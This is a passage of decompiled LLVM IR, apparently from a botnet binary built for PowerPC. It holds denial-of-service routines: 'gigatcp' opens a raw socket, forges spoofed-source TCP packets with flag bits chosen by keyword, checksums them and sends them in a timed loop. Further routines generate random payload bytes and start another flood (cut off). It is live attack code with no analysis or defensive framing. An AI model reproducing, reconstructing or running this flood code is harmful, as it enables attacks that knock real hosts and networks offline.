  store i32 40, i32* @r3, align 4
  %v1_10008534 = call i32 @htons(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008560.342 to i32), i32* @lr, align 4
  %v4_1000855c = call i32 @bcopy(i32 %v2_10008544, i32 %v2_1000854c, i32 20, i32 %v2_10008548)
  store i32 20, i32* @r5, align 4
  store i32 268469632, i32* @lr, align 4
  %v4_1000857c = call i32 @bcopy(i32 %v2_10008564, i32 %v2_1000856c, i32 20, i32 %v2_10008548)
  %v3_10008594 = call i32 @in_cksum(i16* %v2_10008594, i32 52)
  store i32 268469708, i32* @lr, align 4
  %v6_100085c8 = call i32 @sendto(i32 %v3_100081d4, i32 %v2_10008490, i32 60, i32 0, i32 %v2_100085a8, i32 16)
  %tmp73 = icmp ult i32 %stack_var_-260.0, 100
  br i1 %tmp73, label %dec_label_pc_1000860c, label %dec_label_pc_100085d8

dec_label_pc_100085d8:                            ; preds = %dec_label_pc_1000840c
  store i32 268469728, i32* @lr, align 4
  %v1_100085dc = call i32 @__GI_time(i32 0)
  %v2_100085f4 = icmp ult i32 %v1_100085dc, %v2_100085f0
  br i1 %v2_100085f4, label %dec_label_pc_10008604, label %dec_label_pc_100085fc

dec_label_pc_100085fc:                            ; preds = %dec_label_pc_100085d8
  %v0_10008600 = call i32 @__GI_exit()
  br label %dec_label_pc_10008604

dec_label_pc_10008604:                            ; preds = %dec_label_pc_100085d8, %dec_label_pc_100085fc
  br label %dec_label_pc_1000860c

dec_label_pc_1000860c:                            ; preds = %dec_label_pc_1000840c, %dec_label_pc_10008604
  %stack_var_-260.1 = phi i32 [ %stack_var_-260.0, %dec_label_pc_1000840c ], [ 0, %dec_label_pc_10008604 ]
  %v1_10008610 = add i32 %stack_var_-260.1, 1
  br label %dec_label_pc_100083e0

dec_label_pc_1000861c:                            ; preds = %entry
  ret i32 %v1_100081b8

; uselistorder directives
  uselistorder i32 %v0_1000840c, { 1, 0 }
  uselistorder i32 %v2_10008548, { 1, 0 }
  uselistorder i32 %v1_100083ac, { 1, 0 }
  uselistorder i32 %v1_1000825c, { 1, 2, 0 }
  uselistorder i32 %v3_1000822c, { 1, 0 }
  uselistorder i32* %stack_var_-296, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-256, { 0, 2, 1 }
  uselistorder i32* %stack_var_-196, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000860c, { 1, 0 }
  uselistorder label %dec_label_pc_10008604, { 1, 0 }
  uselistorder label %dec_label_pc_1000840c, { 1, 0 }
  uselistorder label %dec_label_pc_1000822c, { 1, 0 }
  uselistorder label %dec_label_pc_10008264.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100081f4, { 1, 0 }
}

define i32 @gigatcp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-360 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %v2_10008664 = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_10008664, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002b134.344 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000867c.345 to i32), i32* @lr, align 4
  %v0_10008678 = call i32 @memcpy()
  %v2_10008694 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_10008694, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002b0b8.346 to i32), i32* @r4, align 4
  store i32 124, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_100086ac.347 to i32), i32* @lr, align 4
  %v0_100086a8 = call i32 @memcpy()
  store i32 268469948, i32* @lr, align 4
  %v1_100086b8 = call i32 @__GI_time(i32 0)
  %v1_100086c8 = call i32 @mfork(i32 %arg2)
  %v3_100086d0 = icmp eq i32 %v1_100086c8, 0
  br i1 %v3_100086d0, label %dec_label_pc_100086d8, label %dec_label_pc_10008e18

dec_label_pc_100086d8:                            ; preds = %entry
  store i32 268469992, i32* @lr, align 4
  %v3_100086e4 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp81 = icmp sgt i32 %v3_100086e4, -1
  br i1 %tmp81, label %dec_label_pc_10008704, label %dec_label_pc_100086fc

dec_label_pc_100086fc:                            ; preds = %dec_label_pc_100086d8
  %v0_10008700 = call i32 @__GI_exit()
  br label %dec_label_pc_10008704

dec_label_pc_10008704:                            ; preds = %dec_label_pc_100086d8, %dec_label_pc_100086fc
  %v2_10008708 = icmp sgt i32 %arg3, 2
  br i1 %v2_10008708, label %dec_label_pc_10008774.preheader, label %dec_label_pc_10008710

dec_label_pc_10008710:                            ; preds = %dec_label_pc_10008704
  %v6_10008724 = call i32 @Send(i32 %arg1, i32 ptrtoint ([45 x i8]* @global_var_1002b184.348 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000872c = call i32 @__GI_exit()
  br label %dec_label_pc_10008774.preheader

dec_label_pc_10008774.preheader:                  ; preds = %dec_label_pc_10008704, %dec_label_pc_10008710
  %v2_10008748 = ptrtoint i32* %stack_var_-408 to i32
  %v2_1000874c = add i32 %v2_10008748, 176
  %v2_10008760 = add i32 %v2_10008748, 88
  br label %dec_label_pc_1000873c

dec_label_pc_1000873c:                            ; preds = %dec_label_pc_10008774.preheader, %dec_label_pc_1000873c
  %storemerge1522 = phi i32 [ 0, %dec_label_pc_10008774.preheader ], [ %v1_1000876c, %dec_label_pc_1000873c ]
  %v1_10008744 = mul i32 %storemerge1522, 4
  %v1_10008750 = add i32 %v2_1000874c, %v1_10008744
  %v1_10008754 = inttoptr i32 %v1_10008750 to i32*
  %v2_10008754 = load i32, i32* %v1_10008754, align 4
  %v1_10008764 = trunc i32 %v2_10008754 to i8
  %v3_10008764 = add i32 %v2_10008760, %storemerge1522
  %v4_10008764 = inttoptr i32 %v3_10008764 to i8*
  store i8 %v1_10008764, i8* %v4_10008764, align 1
  %v1_1000876c = add nuw nsw i32 %storemerge1522, 1
  %tmp82 = icmp slt i32 %v1_1000876c, 20
  br i1 %tmp82, label %dec_label_pc_1000873c, label %dec_label_pc_10008780

dec_label_pc_10008780:                            ; preds = %dec_label_pc_1000873c
  %v1_10008784 = add i32 %arg4, 4
  %v1_10008788 = inttoptr i32 %v1_10008784 to i32*
  %v2_10008788 = load i32, i32* %v1_10008788, align 4
  store i32 268470168, i32* @lr, align 4
  %v3_10008794 = call i32 @host2ip(i32 %arg2, i32 %v2_10008788, i32 %v1_10008784)
  %v1_100087a4 = add i32 %arg4, 12
  %v1_100087a8 = inttoptr i32 %v1_100087a4 to i32*
  %v2_100087a8 = load i32, i32* %v1_100087a8, align 4
  store i32 268470196, i32* @lr, align 4
  %v1_100087b0 = call i32 @atol(i32 %v2_100087a8)
  %v2_100087c4 = load i32, i32* %v1_10008788, align 4
  %v1_100087cc = add i32 %arg4, 8
  %v1_100087d0 = inttoptr i32 %v1_100087cc to i32*
  %v7_100087f0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_1002b1b4.351 to i32), i32 %arg2, i32 %v2_100087c4)
  store i32 2, i32* %stack_var_-248, align 4
  %v1_10008804 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10008814 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10008814, i32* %stack_var_-360, align 4
  %v1_1000884c = call i32 @__asm_rlwimi(i32 10, i32 28, i32 0, i32 3)
  %v1_1000885c = call i32 @__asm_rlwimi(i32 0, i32 24, i32 4, i32 7)
  %v1_10008868 = call i32 @__asm_rlwinm(i32 %v1_1000885c, i32 0, i32 11, i32 9)
  %v1_10008874 = call i32 @__asm_rlwinm(i32 %v1_10008868, i32 0, i32 12, i32 10)
  %v1_10008880 = call i32 @__asm_rlwinm(i32 %v1_10008874, i32 0, i32 13, i32 11)
  %v1_1000888c = call i32 @__asm_rlwinm(i32 %v1_10008880, i32 0, i32 15, i32 13)
  %v1_10008898 = call i32 @__asm_rlwinm(i32 %v1_1000888c, i32 0, i32 16, i32 14)
  %v1_100088a4 = call i32 @__asm_rlwinm(i32 %v1_10008898, i32 0, i32 14, i32 12)
  %v2_100088bc = load i32, i32* %v1_100087d0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b1f8.353 to i32), i32* @r4, align 4
  %v3_100088cc = inttoptr i32 %v2_100088bc to i8*
  %v4_100088cc = call i32 @__GI_strcoll(i8* %v3_100088cc, i32 ptrtoint ([4 x i8]* @global_var_1002b1f8.353 to i32))
  %v3_100088d4 = icmp eq i32 %v4_100088cc, 0
  br i1 %v3_100088d4, label %dec_label_pc_100088dc, label %dec_label_pc_10008928

dec_label_pc_100088dc:                            ; preds = %dec_label_pc_10008780
  br label %dec_label_pc_10008bf0.preheader

dec_label_pc_10008928:                            ; preds = %dec_label_pc_10008780
  %v2_10008930 = load i32, i32* %v1_100087d0, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002b1fc.354 to i32), i32* @r4, align 4
  %v3_10008940 = inttoptr i32 %v2_10008930 to i8*
  %v4_10008940 = call i32 @__GI_strcoll(i8* %v3_10008940, i32 ptrtoint ([5 x i8]* @global_var_1002b1fc.354 to i32))
  %v3_10008948 = icmp eq i32 %v4_10008940, 0
  br i1 %v3_10008948, label %dec_label_pc_10008950, label %dec_label_pc_10008978

dec_label_pc_10008950:                            ; preds = %dec_label_pc_10008928
  br label %dec_label_pc_10008bf0.preheader

dec_label_pc_10008978:                            ; preds = %dec_label_pc_10008928
  %v2_10008980 = load i32, i32* %v1_100087d0, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002b204.355 to i32), i32* @r4, align 4
  %v3_10008990 = inttoptr i32 %v2_10008980 to i8*
  %v4_10008990 = call i32 @__GI_strcoll(i8* %v3_10008990, i32 ptrtoint ([5 x i8]* @global_var_1002b204.355 to i32))
  %v3_10008998 = icmp eq i32 %v4_10008990, 0
  br i1 %v3_10008998, label %dec_label_pc_100089a0, label %dec_label_pc_100089bc

dec_label_pc_100089a0:                            ; preds = %dec_label_pc_10008978
  br label %dec_label_pc_10008bf0.preheader

dec_label_pc_100089bc:                            ; preds = %dec_label_pc_10008978
  %v2_100089c4 = load i32, i32* %v1_100087d0, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002b20c.356 to i32), i32* @r4, align 4
  %v3_100089d4 = inttoptr i32 %v2_100089c4 to i8*
  %v4_100089d4 = call i32 @__GI_strcoll(i8* %v3_100089d4, i32 ptrtoint ([7 x i8]* @global_var_1002b20c.356 to i32))
  %v3_100089dc = icmp eq i32 %v4_100089d4, 0
  br i1 %v3_100089dc, label %dec_label_pc_100089e4, label %dec_label_pc_10008a00

dec_label_pc_100089e4:                            ; preds = %dec_label_pc_100089bc
  br label %dec_label_pc_10008bf0.preheader

dec_label_pc_10008a00:                            ; preds = %dec_label_pc_100089bc
  %v2_10008a08 = load i32, i32* %v1_100087d0, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002b214.357 to i32), i32* @r4, align 4
  %v3_10008a18 = inttoptr i32 %v2_10008a08 to i8*
  %v4_10008a18 = call i32 @__GI_strcoll(i8* %v3_10008a18, i32 ptrtoint ([8 x i8]* @global_var_1002b214.357 to i32))
  %v3_10008a20 = icmp eq i32 %v4_10008a18, 0
  br i1 %v3_10008a20, label %dec_label_pc_10008a28, label %dec_label_pc_10008a50

dec_label_pc_10008a28:                            ; preds = %dec_label_pc_10008a00
  br label %dec_label_pc_10008bf0.preheader

dec_label_pc_10008a50:                            ; preds = %dec_label_pc_10008a00
  %v2_10008a58 = load i32, i32* %v1_100087d0, align 4
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268470892, i32* @lr, align 4
  %v4_10008a68 = call i32 @__GI_strtok(i32 %v2_10008a58, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v4_10008a68, i32* %stack_var_-408, align 4
  %v3_10008bb020 = icmp eq i32 %v4_10008a68, 0
  br i1 %v3_10008bb020, label %dec_label_pc_10008bf0.preheader, label %dec_label_pc_10008a78

dec_label_pc_10008a78:                            ; preds = %dec_label_pc_10008a50, %dec_label_pc_10008b94
  %v3_10008a78 = phi i32 [ %v4_10008ba0, %dec_label_pc_10008b94 ], [ %v4_10008a68, %dec_label_pc_10008a50 ]
  %stack_var_-328.121 = phi i32 [ %stack_var_-328.0, %dec_label_pc_10008b94 ], [ %v1_100088a4, %dec_label_pc_10008a50 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1002b220.359 to i32), i32* @r4, align 4
  %v3_10008a88 = inttoptr i32 %v3_10008a78 to i8*
  %v4_10008a88 = call i32 @__GI_strcoll(i8* %v3_10008a88, i32 ptrtoint ([4 x i8]* @global_var_1002b220.359 to i32))
  %v3_10008a90 = icmp eq i32 %v4_10008a88, 0
  br i1 %v3_10008a90, label %dec_label_pc_10008a98, label %dec_label_pc_10008aa8

dec_label_pc_10008a98:                            ; preds = %dec_label_pc_10008a78
  %v1_10008a9c = or i32 %stack_var_-328.121, 131072
  br label %dec_label_pc_10008b94

dec_label_pc_10008aa8:                            ; preds = %dec_label_pc_10008a78
  %v3_10008aa8 = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b224.360 to i32), i32* @r4, align 4
  %v3_10008ab8 = inttoptr i32 %v3_10008aa8 to i8*
  %v4_10008ab8 = call i32 @__GI_strcoll(i8* %v3_10008ab8, i32 ptrtoint ([4 x i8]* @global_var_1002b224.360 to i32))
  %v3_10008ac0 = icmp eq i32 %v4_10008ab8, 0
  br i1 %v3_10008ac0, label %dec_label_pc_10008ac8, label %dec_label_pc_10008ad8

dec_label_pc_10008ac8:                            ; preds = %dec_label_pc_10008aa8
  %v1_10008acc = or i32 %stack_var_-328.121, 262144
  br label %dec_label_pc_10008b94

dec_label_pc_10008ad8:                            ; preds = %dec_label_pc_10008aa8
  %v3_10008ad8 = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b228.361 to i32), i32* @r4, align 4
  %v3_10008ae8 = inttoptr i32 %v3_10008ad8 to i8*
  %v4_10008ae8 = call i32 @__GI_strcoll(i8* %v3_10008ae8, i32 ptrtoint ([4 x i8]* @global_var_1002b228.361 to i32))
  %v3_10008af0 = icmp eq i32 %v4_10008ae8, 0
  br i1 %v3_10008af0, label %dec_label_pc_10008af8, label %dec_label_pc_10008b08

dec_label_pc_10008af8:                            ; preds = %dec_label_pc_10008ad8
  %v1_10008afc = or i32 %stack_var_-328.121, 65536
  br label %dec_label_pc_10008b94

dec_label_pc_10008b08:                            ; preds = %dec_label_pc_10008ad8
  %v3_10008b08 = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b22c.362 to i32), i32* @r4, align 4
  %v3_10008b18 = inttoptr i32 %v3_10008b08 to i8*
  %v4_10008b18 = call i32 @__GI_strcoll(i8* %v3_10008b18, i32 ptrtoint ([4 x i8]* @global_var_1002b22c.362 to i32))
  %v3_10008b20 = icmp eq i32 %v4_10008b18, 0
  br i1 %v3_10008b20, label %dec_label_pc_10008b28, label %dec_label_pc_10008b38

dec_label_pc_10008b28:                            ; preds = %dec_label_pc_10008b08
  %v1_10008b2c = or i32 %stack_var_-328.121, 1048576
  br label %dec_label_pc_10008b94

dec_label_pc_10008b38:                            ; preds = %dec_label_pc_10008b08
  %v3_10008b38 = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b230.363 to i32), i32* @r4, align 4
  %v3_10008b48 = inttoptr i32 %v3_10008b38 to i8*
  %v4_10008b48 = call i32 @__GI_strcoll(i8* %v3_10008b48, i32 ptrtoint ([4 x i8]* @global_var_1002b230.363 to i32))
  %v3_10008b50 = icmp eq i32 %v4_10008b48, 0
  br i1 %v3_10008b50, label %dec_label_pc_10008b58, label %dec_label_pc_10008b68

dec_label_pc_10008b58:                            ; preds = %dec_label_pc_10008b38
  %v1_10008b5c = or i32 %stack_var_-328.121, 524288
  br label %dec_label_pc_10008b94

dec_label_pc_10008b68:                            ; preds = %dec_label_pc_10008b38
  %v3_10008b68 = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b234.364 to i32), i32* @r4, align 4
  %v3_10008b78 = inttoptr i32 %v3_10008b68 to i8*
  %v4_10008b78 = call i32 @__GI_strcoll(i8* %v3_10008b78, i32 ptrtoint ([4 x i8]* @global_var_1002b234.364 to i32))
  %v3_10008b80 = icmp eq i32 %v4_10008b78, 0
  br i1 %v3_10008b80, label %dec_label_pc_10008b88, label %dec_label_pc_10008b94

dec_label_pc_10008b88:                            ; preds = %dec_label_pc_10008b68
  %v1_10008b8c = or i32 %stack_var_-328.121, 2097152
  br label %dec_label_pc_10008b94

dec_label_pc_10008b94:                            ; preds = %dec_label_pc_10008b68, %dec_label_pc_10008b58, %dec_label_pc_10008b28, %dec_label_pc_10008af8, %dec_label_pc_10008ac8, %dec_label_pc_10008a98, %dec_label_pc_10008b88
  %stack_var_-328.0 = phi i32 [ %v1_10008a9c, %dec_label_pc_10008a98 ], [ %v1_10008acc, %dec_label_pc_10008ac8 ], [ %v1_10008afc, %dec_label_pc_10008af8 ], [ %v1_10008b2c, %dec_label_pc_10008b28 ], [ %v1_10008b5c, %dec_label_pc_10008b58 ], [ %v1_10008b8c, %dec_label_pc_10008b88 ], [ %stack_var_-328.121, %dec_label_pc_10008b68 ]
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268471204, i32* @lr, align 4
  %v4_10008ba0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v4_10008ba0, i32* %stack_var_-408, align 4
  %v3_10008bb0 = icmp eq i32 %v4_10008ba0, 0
  br i1 %v3_10008bb0, label %dec_label_pc_10008bf0.preheader, label %dec_label_pc_10008a78

dec_label_pc_10008bf0.preheader:                  ; preds = %dec_label_pc_10008b94, %dec_label_pc_10008a50, %dec_label_pc_10008a28, %dec_label_pc_100089e4, %dec_label_pc_100089a0, %dec_label_pc_10008950, %dec_label_pc_100088dc
  %v2_10008c9c = ptrtoint i32* %stack_var_-360 to i32
  %v2_10008ca8 = bitcast i32* %stack_var_-360 to i16*
  %v2_10008d40 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10008d44 = ptrtoint i32* %stack_var_-300 to i32
  %v2_10008d48 = ptrtoint i32* %stack_var_-288 to i32
  %v2_10008d60 = ptrtoint i32* %stack_var_-320 to i32
  %v2_10008d68 = ptrtoint i32* %stack_var_-268 to i32
  %v2_10008d90 = bitcast i32* %stack_var_-300 to i16*
  %v2_10008da4 = ptrtoint i32* %stack_var_-248 to i32
  %v2_10008dec = add i32 %v1_100087b0, %v1_100086b8
  br label %dec_label_pc_10008bf0

dec_label_pc_10008bf0:                            ; preds = %dec_label_pc_10008bf0.preheader, %dec_label_pc_10008e08
  %storemerge = phi i32 [ %v1_10008e0c, %dec_label_pc_10008e08 ], [ 0, %dec_label_pc_10008bf0.preheader ]
  store i32 268471292, i32* @lr, align 4
  %v2_10008bf8 = call i32 @realrand(i32 0, i32 31)
  %v0_10008c18 = call i32 @getspoof()
  store i32 60, i32* @r3, align 4
  %v1_10008c38 = call i32 @htons(i32 60)
  store i32 268471368, i32* @lr, align 4
  %v0_10008c44 = call i32 @random()
  %v1_10008c68 = urem i32 %v0_10008c18, 65536
  store i32 %v1_10008c68, i32* %stack_var_-340, align 4
  store i32 268471424, i32* @lr, align 4
  %v0_10008c7c = call i32 @random()
  %v3_10008ca8 = call i32 @in_cksum(i16* %v2_10008ca8, i32 20)
  store i32 268471480, i32* @lr, align 4
  %v0_10008cb4 = call i32 @random()
  store i32 %v0_10008c18, i32* %stack_var_-300, align 4
  store i32 40, i32* @r3, align 4
  %v1_10008d30 = call i32 @htons(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008d5c.365 to i32), i32* @lr, align 4
  %v4_10008d58 = call i32 @bcopy(i32 %v2_10008d40, i32 %v2_10008d48, i32 20, i32 %v2_10008d44)
  store i32 20, i32* @r5, align 4
  store i32 268471676, i32* @lr, align 4
  %v4_10008d78 = call i32 @bcopy(i32 %v2_10008d60, i32 %v2_10008d68, i32 20, i32 %v2_10008d44)
  %v3_10008d90 = call i32 @in_cksum(i16* %v2_10008d90, i32 52)
  store i32 268471752, i32* @lr, align 4
  %v6_10008dc4 = call i32 @sendto(i32 %v3_100086e4, i32 %v2_10008c9c, i32 60, i32 0, i32 %v2_10008da4, i32 16)
  %tmp83 = icmp ult i32 %storemerge, 100
  br i1 %tmp83, label %dec_label_pc_10008e08, label %dec_label_pc_10008dd4

dec_label_pc_10008dd4:                            ; preds = %dec_label_pc_10008bf0
  store i32 268471772, i32* @lr, align 4
  %v1_10008dd8 = call i32 @__GI_time(i32 0)
  %v2_10008df0 = icmp ult i32 %v1_10008dd8, %v2_10008dec
  br i1 %v2_10008df0, label %dec_label_pc_10008e00, label %dec_label_pc_10008df8

dec_label_pc_10008df8:                            ; preds = %dec_label_pc_10008dd4
  %v0_10008dfc = call i32 @__GI_exit()
  br label %dec_label_pc_10008e00

dec_label_pc_10008e00:                            ; preds = %dec_label_pc_10008dd4, %dec_label_pc_10008df8
  br label %dec_label_pc_10008e08

dec_label_pc_10008e08:                            ; preds = %dec_label_pc_10008bf0, %dec_label_pc_10008e00
  %stack_var_-364.1 = phi i32 [ %storemerge, %dec_label_pc_10008bf0 ], [ 0, %dec_label_pc_10008e00 ]
  %v1_10008e0c = add i32 %stack_var_-364.1, 1
  br label %dec_label_pc_10008bf0

dec_label_pc_10008e18:                            ; preds = %entry
  ret i32 %v1_100086c8

; uselistorder directives
  uselistorder i32 %v0_10008c18, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10008d44, { 1, 0 }
  uselistorder i32 %v4_10008ba0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-328.121, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge1522, { 2, 1, 0 }
  uselistorder i32* %stack_var_-408, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32* %stack_var_-360, { 0, 2, 1 }
  uselistorder i32* %stack_var_-300, { 1, 0, 2 }
  uselistorder i32* %stack_var_-248, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008e08, { 1, 0 }
  uselistorder label %dec_label_pc_10008e00, { 1, 0 }
  uselistorder label %dec_label_pc_10008bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10008b94, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_10008a78, { 1, 0 }
  uselistorder label %dec_label_pc_1000873c, { 1, 0 }
  uselistorder label %dec_label_pc_10008774.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10008704, { 1, 0 }
}

define i32 @makeRandomShit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268471896, i32* @lr, align 4
  %v1_10008e54 = call i32 @__GI_time(i32 0)
  store i32 %v1_10008e54, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008e64.367 to i32), i32* @lr, align 4
  %v1_10008e60 = call i32 @srand(i32 %v1_10008e54)
  store i32 %v1_10008e60, i32* %r3.global-to-local, align 4
  %v2_10008ee82 = icmp sgt i32 %arg2, 0
  br i1 %v2_10008ee82, label %dec_label_pc_10008e78, label %dec_label_pc_10008ef0

dec_label_pc_10008e78:                            ; preds = %entry, %dec_label_pc_10008e78
  %storemerge15 = phi i32 [ %v1_10008ed8, %dec_label_pc_10008e78 ], [ 0, %entry ]
  store i32 268471948, i32* @lr, align 4
  %v0_10008e88 = call i32 @random()
  store i32 %v0_10008e88, i32* %r3.global-to-local, align 4
  %v2_10008ea8 = srem i32 %v0_10008e88, 255
  %fold = add nsw i32 %v2_10008ea8, 1
  %v1_10008ed0 = trunc i32 %fold to i8
  %v2_10008ed0 = load i32, i32* @r29, align 4
  %v3_10008ed0 = inttoptr i32 %v2_10008ed0 to i8*
  store i8 %v1_10008ed0, i8* %v3_10008ed0, align 1
  %v1_10008ed8 = add nuw nsw i32 %storemerge15, 1
  %v2_10008ee8 = icmp slt i32 %v1_10008ed8, %arg2
  br i1 %v2_10008ee8, label %dec_label_pc_10008e78, label %dec_label_pc_10008ee0.dec_label_pc_10008ef0_crit_edge

dec_label_pc_10008ee0.dec_label_pc_10008ef0_crit_edge: ; preds = %dec_label_pc_10008e78
  %v0_10008f08.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008ef0

dec_label_pc_10008ef0:                            ; preds = %dec_label_pc_10008ee0.dec_label_pc_10008ef0_crit_edge, %entry
  %v0_10008f08 = phi i32 [ %v0_10008f08.pre, %dec_label_pc_10008ee0.dec_label_pc_10008ef0_crit_edge ], [ %v1_10008e60, %entry ]
  ret i32 %v0_10008f08

; uselistorder directives
  uselistorder i32 %v1_10008ed8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10008e78, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  store i32 268472136, i32* @lr, align 4
  %v1_10008f44 = call i32 @__GI_time(i32 0)
  %v2_10008f54 = icmp sgt i32 %arg3, 3
  br i1 %v2_10008f54, label %dec_label_pc_10008f7c, label %dec_label_pc_10008f5c

dec_label_pc_10008f5c:                            ; preds = %entry
  %v6_10008f70 = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_1002b238.368 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10008f78 = call i32 @__GI_exit()
  br label %dec_label_pc_10008f7c

dec_label_pc_10008f7c:                            ; preds = %entry, %dec_label_pc_10008f5c
  %v1_10008f80 = call i32 @mfork(i32 %arg2)
  %v3_10008f88 = icmp eq i32 %v1_10008f80, 0
  br i1 %v3_10008f88, label %dec_label_pc_10008f90, label %dec_label_pc_10009258

dec_label_pc_10008f90:                            ; preds = %dec_label_pc_10008f7c
  store i32 1024, i32* @r3, align 4
  store i32 268472216, i32* @lr, align 4
  %v0_10008f94 = call i32 @malloc()
  store i32 %v0_10008f94, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268472240, i32* @lr, align 4
  %v0_10008fac = call i32 @__GI_memset()
  %v1_10008fb4 = add i32 %arg4, 8
  %v1_10008fb8 = inttoptr i32 %v1_10008fb4 to i32*
  %v2_10008fb8 = load i32, i32* %v1_10008fb8, align 4
  store i32 ptrtoint (i32* @global_var_1002b290.370 to i32), i32* @r4, align 4
  %v2_10008fc8 = inttoptr i32 %v2_10008fb8 to i8*
  %v3_10008fc8 = call i32 @__GI_strcoll(i8* %v2_10008fc8, i32 ptrtoint (i32* @global_var_1002b290.370 to i32))
  %v3_10008fd0 = icmp eq i32 %v3_10008fc8, 0
  br i1 %v3_10008fd0, label %dec_label_pc_10008fd8, label %dec_label_pc_10008fe0

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008f90
  br label %dec_label_pc_10008fe0

dec_label_pc_10008fe0:                            ; preds = %dec_label_pc_10008f90, %dec_label_pc_10008fd8
  %stack_var_-64.0 = phi i32 [ 1, %dec_label_pc_10008fd8 ], [ 0, %dec_label_pc_10008f90 ]
  %v1_10008fe4 = add i32 %arg4, 12
  %v1_10008fe8 = inttoptr i32 %v1_10008fe4 to i32*
  %v2_10008fe8 = load i32, i32* %v1_10008fe8, align 4
  store i32 ptrtoint (i32* @global_var_1002b290.370 to i32), i32* @r4, align 4
  %v2_10008ff8 = inttoptr i32 %v2_10008fe8 to i8*
  %v3_10008ff8 = call i32 @__GI_strcoll(i8* %v2_10008ff8, i32 ptrtoint (i32* @global_var_1002b290.370 to i32))
  %v3_10009000 = icmp eq i32 %v3_10008ff8, 0
  br i1 %v3_10009000, label %dec_label_pc_10009008, label %dec_label_pc_10009020

dec_label_pc_10009008:                            ; preds = %dec_label_pc_10008fe0
  br label %dec_label_pc_10009030

dec_label_pc_10009020:                            ; preds = %dec_label_pc_10008fe0
  %v2_10009028 = load i32, i32* %v1_10008fe8, align 4
  %v5_1000902c = inttoptr i32 %v2_10009028 to i8*
  br label %dec_label_pc_10009030

dec_label_pc_10009030:                            ; preds = %dec_label_pc_10009008, %dec_label_pc_10009020
